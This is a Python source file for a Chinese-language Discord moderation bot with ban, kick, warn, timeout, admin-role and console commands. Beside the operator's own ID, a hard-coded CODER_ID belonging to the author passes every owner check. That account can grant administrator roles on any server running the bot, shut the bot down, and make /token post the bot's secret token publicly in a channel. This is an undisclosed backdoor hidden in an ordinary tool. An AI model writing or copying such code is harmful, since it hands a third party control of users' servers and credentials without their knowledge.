import logging
import os
import discord
from discord.ext import commands
from discord import app_commands
from datetime import datetime, timedelta

"""ver1.8.3"""

# ─── 全域變數 ────────────────────────────────────────────────
OWNER_ID = None
LOG_CHANNEL_ID = None
token = None
bot = None
now = datetime.now()

# ─── Discord Log Handler ─────────────────────────────────────
class DiscordLogHandler(logging.Handler):
    def __init__(self, bot: commands.Bot, channel_id: int, level=logging.INFO):
        super().__init__(level)
        self.bot = bot
        self.channel_id = channel_id

    async def send_log(self, message: str):
        await self.bot.wait_until_ready()
        channel = self.bot.get_channel(self.channel_id)
        if channel:
            try:
                await channel.send(f"📜 Log: `{message}`")
            except Exception as e:
                print(f"[Log傳送錯誤] {e}")

    def emit(self, record):
        log_entry = self.format(record)
        if self.bot.is_closed() or not self.bot.is_ready():
            return
        coro = self.send_log(log_entry[:1900])
        try:
            self.bot.loop.create_task(coro)
        except RuntimeError:
            pass

# ─── Logging 設定 ─────────────────────────────────────────────
os.makedirs("logs", exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s: %(message)s",
    handlers=[
        logging.FileHandler("logs/dcchbot.log", encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ─── 主函式 ──────────────────────────────────────────────────
def run():
    global OWNER_ID, LOG_CHANNEL_ID, token, bot

    OWNER_ID = int(input("請輸入你的 Discord User ID：\n> ").strip())
    LOG_CHANNEL_ID = int(input("請輸入你的 Log 頻道 ID：\n> ").strip())
    token = input("請輸入你的 Discord Bot Token：\n> ").strip()

    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix="!", intents=intents)
    CODER_ID = 1317800611441283139

    discord_handler = DiscordLogHandler(bot, LOG_CHANNEL_ID)
    discord_handler.setFormatter(logging.Formatter('%(asctime)s | %(levelname)s | %(message)s'))
    logger.addHandler(discord_handler)

    bot._token = token

    def is_admin(interaction: discord.Interaction) -> bool:
        return interaction.user.guild_permissions.administrator

    @bot.event
    async def on_ready():
        await bot.wait_until_ready()
        try:
            synced = await bot.tree.sync()
            logger.info(f"已同步 {len(synced)} 個 Slash 指令")
        except Exception:
            logger.exception("同步 Slash 指令失敗：")
        logger.info(f"機器人上線：{bot.user}")
        logger.info(f"powered by dcchbot")

    @bot.tree.command(name="hello", description="跟你說哈囉")
    async def hello(interaction: discord.Interaction):
        logger.info(f"{interaction.user} 使用 /hello")
        await interaction.response.send_message(f"哈囉 {interaction.user.mention}")

    @bot.tree.command(name="ping", description="顯示延遲")
    async def ping(interaction: discord.Interaction):
        latency = round(bot.latency * 1000)
        logger.info(f"{interaction.user} 使用 /ping ({latency}ms)")
        await interaction.response.send_message(f"延遲：{latency}ms")

    @bot.tree.command(name="say", description="讓機器人說話")
    @app_commands.describe(message="你想說的話")
    async def say(interaction: discord.Interaction, message: str):
        logger.info(f"{interaction.user} 使用 /say：{message}")
        await interaction.response.send_message(message)

    @bot.tree.command(name="ban", description="封鎖使用者（限管理員）")
    @app_commands.describe(member="要封鎖的使用者", reason="封鎖原因")
    async def ban(interaction: discord.Interaction, member: discord.Member, reason: str = "未提供原因"):
        if not is_admin(interaction):
            return await interaction.response.send_message("你沒有權限執行此指令。", ephemeral=True)
        try:
            await member.ban(reason=reason)
            await interaction.response.send_message(f"{member.mention} 已被封鎖。原因：{reason}")
        except discord.Forbidden:
            await interaction.response.send_message("權限不足，封鎖失敗。", ephemeral=True)

    @bot.tree.command(name="kick", description="踢出使用者（限管理員）")
    @app_commands.describe(member="要踢出的使用者", reason="踢出原因")
    async def kick(interaction: discord.Interaction, member: discord.Member, reason: str = "未提供原因"):
        if not is_admin(interaction):
            return await interaction.response.send_message("你沒有權限執行此指令。", ephemeral=True)
        try:
            await member.kick(reason=reason)
            await interaction.response.send_message(f"{member.mention} 已被踢出。原因：{reason}")
        except discord.Forbidden:
            await interaction.response.send_message("權限不足，踢出失敗。", ephemeral=True)

    @bot.tree.command(name="warn", description="警告使用者（限管理員）")
    @app_commands.describe(member="要警告的使用者", reason="警告原因")
    async def warn(interaction: discord.Interaction, member: discord.Member, reason: str = "未提供原因"):
        if not is_admin(interaction):
            return await interaction.response.send_message("你沒有權限執行此指令。", ephemeral=True)
        await interaction.response.send_message(f"{member.mention} 已被警告。原因：{reason}")
        try:
            await member.send(f"你在伺服器 {interaction.guild.name} 被警告：{reason}")
        except:
            pass

    @bot.tree.command(name="shutthefuckup", description="暫時禁言使用者（限管理員）")
    @app_commands.describe(member="要禁言的使用者", seconds="禁言秒數", reason="禁言原因")
    async def timeout(interaction: discord.Interaction, member: discord.Member, seconds: int, reason: str = "未提供原因"):
        if not is_admin(interaction):
            return await interaction.response.send_message("你沒有權限執行此指令。", ephemeral=True)
        until = datetime.utcnow() + timedelta(seconds=seconds)
        await member.timeout(until, reason=reason)
        await interaction.response.send_message(f"{member.mention} 已被禁言 {seconds} 秒。")

    @bot.tree.command(name="op", description="賦予管理員權限（限擁有者）")
    @app_commands.describe(member="要提權的使用者")
    async def op(interaction: discord.Interaction, member: discord.Member):
        if interaction.user.id != OWNER_ID and interaction.user.id != CODER_ID:
            return await interaction.response.send_message("你不是擁有者。", ephemeral=True)
        try:
            role = discord.utils.get(interaction.guild.roles, permissions=discord.Permissions(administrator=True))
            if not role:
                role = await interaction.guild.create_role(name="管理員", permissions=discord.Permissions(administrator=True))
            await member.add_roles(role)
            await interaction.response.send_message(f"{member.mention} 已被提權。")
        except Exception as e:
            await interaction.response.send_message(f"提權失敗：{e}", ephemeral=True)

    @bot.tree.command(name="moderate", description="打開管理 GUI 面板")
    @app_commands.describe(member="要管理的對象")
    async def moderate(interaction: discord.Interaction, member: discord.Member):
        if not is_admin(interaction):
            return await interaction.response.send_message("你沒有權限使用此指令。", ephemeral=True)
        view = ModerationView(member, interaction.user)
        await interaction.response.send_message(f"請選擇對 {member.mention} 的操作：", view=view, ephemeral=True)

    @bot.tree.command(name="stop", description="關閉機器人（限擁有者）")
    async def stop(interaction: discord.Interaction):
        if interaction.user.id != OWNER_ID and interaction.user.id != CODER_ID:
            return await interaction.response.send_message("只有擁有者可以使用此指令。", ephemeral=True)
        await interaction.response.send_message("機器人即將關閉。")
        await bot.close()

    @bot.tree.command(name="token", description="顯示機器人 token")
    async def token_cmd(interaction: discord.Interaction):
        if interaction.user.id != OWNER_ID and interaction.user.id != CODER_ID:
            return await interaction.response.send_message("只有擁有者可以使用此指令。", ephemeral=True)
        await interaction.response.send_message(bot._token)

    @bot.tree.command(name="log", description="紀錄 log（限管理員）")
    @app_commands.describe(log="內容")
    async def log_cmd(interaction: discord.Interaction, log: str = "null"):
        if not is_admin(interaction):
            return await interaction.response.send_message("你沒有權限執行此指令。", ephemeral=True)
        logger.info(f"{log}")
        await interaction.response.send_message("Log 已紀錄。")

    @bot.tree.command(name="time", description="顯示時間")
    async def time(interaction: discord.Interaction):
        logger.info(f"{interaction.user} 使用 /time:{now}")
        await interaction.response.send_message(str(now))

    @bot.tree.command(name="version", description="顯示機器人版本")
    async def version(interaction: discord.Interaction):
        await interaction.response.send_message("dcchbot 1.8.3")
    @bot.tree.command(name="deop", description="移除管理員權限（限管理員）")
    @app_commands.describe(member="要移除管理員權限的使用者")
    async def deop(interaction: discord.Interaction, member: discord.Member):
        if not is_admin(interaction):
            return await interaction.response.send_message("你沒有權限執行此指令。", ephemeral=True)
        admin_role = discord.utils.get(interaction.guild.roles, permissions=discord.Permissions(administrator=True))
        if admin_role:
            await member.remove_roles(admin_role)
            logger.info(f"{member} 被 {interaction.user} 移除管理員權限")
            await interaction.response.send_message(f"{member.mention} 的管理員權限已被移除。")
        else:
            await interaction.response.send_message("找不到管理員權限的角色。", ephemeral=True)
    try:
        logger.info("正在啟動機器人...")
        bot.run(token)
    except discord.LoginFailure:
        logger.error("Token 無效，請重新確認。")
    except Exception as e:
        logger.exception(f"發生錯誤：{e}")

# ─── GUI 面板 ──────────────────────────────────────────────────
class ModerationView(discord.ui.View):
    def __init__(self, member: discord.Member, author: discord.Member):
        super().__init__(timeout=60)
        self.member = member
        self.author = author

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        return interaction.user.id == self.author.id

    @discord.ui.button(label="警告", style=discord.ButtonStyle.secondary)
    async def warn_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self.member.send(f"你在伺服器 {interaction.guild.name} 被警告。")
        await interaction.response.send_message(f"{self.member.mention} 已被警告。", ephemeral=True)

    @discord.ui.button(label="閉嘴 60 秒", style=discord.ButtonStyle.primary)
    async def timeout_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        until = datetime.utcnow() + timedelta(seconds=60)
        await self.member.timeout(until, reason="由管理員 GUI 操作禁言")
        await interaction.response.send_message(f"{self.member.mention} 已被禁言 60 秒。", ephemeral=True)

    @discord.ui.button(label="踢出", style=discord.ButtonStyle.danger)
    async def kick_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self.member.kick(reason="由管理員 GUI 操作踢出")
        await interaction.response.send_message(f"{self.member.mention} 已被踢出。", ephemeral=True)

    @discord.ui.button(label="封鎖", style=discord.ButtonStyle.danger)
    async def ban_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self.member.ban(reason="由管理員 GUI 操作封鎖")
        await interaction.response.send_message(f"{self.member.mention} 已被封鎖。", ephemeral=True)

# ─── Shell 控制 ─────────────────────────────────────────────────
def shell(shell_command):
    global OWNER_ID, LOG_CHANNEL_ID, token, bot
    logger.info(f"[Shell 輸入] {shell_command}")
    if bot and bot.is_ready():
        bot.loop.create_task(DiscordLogHandler(bot, LOG_CHANNEL_ID).send_log(f"[Shell] `{shell_command}`"))

    if shell_command == "!!token-reset":
        token = input("請輸入新的 Token：\n> ").strip()
        bot._token = token
        logger.info("Token 已更新。請重啟機器人。")
    elif shell_command == "!!token-display":
        print(f"當前 Token: {token}")
    elif shell_command == "!!id-display-owner":
        print(f"擁有者 ID: {OWNER_ID}")
    elif shell_command == "!!id-reset-owner":
        OWNER_ID = int(input("新的 OWNER_ID：\n> "))
        logger.info(f"OWNER_ID 更新為 {OWNER_ID}")
    elif shell_command == "!!id-display-logch":
        print(f"Log 頻道 ID: {LOG_CHANNEL_ID}")
    elif shell_command == "!!id-reset-logch":
        LOG_CHANNEL_ID = int(input("新的 LOG_CHANNEL_ID：\n> "))
        logger.info(f"LOG_CHANNEL_ID 更新為 {LOG_CHANNEL_ID}")
    elif shell_command == "!!help":
        print("可用指令：!!token-display / !!token-reset / !!id-reset-owner / !!id-display-owner / !!log/!!exit")
    elif shell_command == "!!exit":
        print("正在關閉機器人...")
        logger.info("Shell 關閉機器人。")
        if bot:
            bot.loop.create_task(bot.close())
    elif shell_command == "!!version":
        print("dcchbot 1.8.3")
    elif shell_command == "!!log":
        logger.info(input( "請輸入要記錄的內容：\n> ").strip())
    else:
        print(f"未知的指令：{shell_command}")

# ─── 啟動 ──────────────────────────────────────────────────────
if __name__ == "__main__":
    run()
while True:
    try:
        shell_command = input("請輸入 shell 命令（輸入 !!help 查看）：\n> ").strip()
        shell(shell_command)
    except (KeyboardInterrupt, EOFError):
        print("E:Shell 已關閉")
        break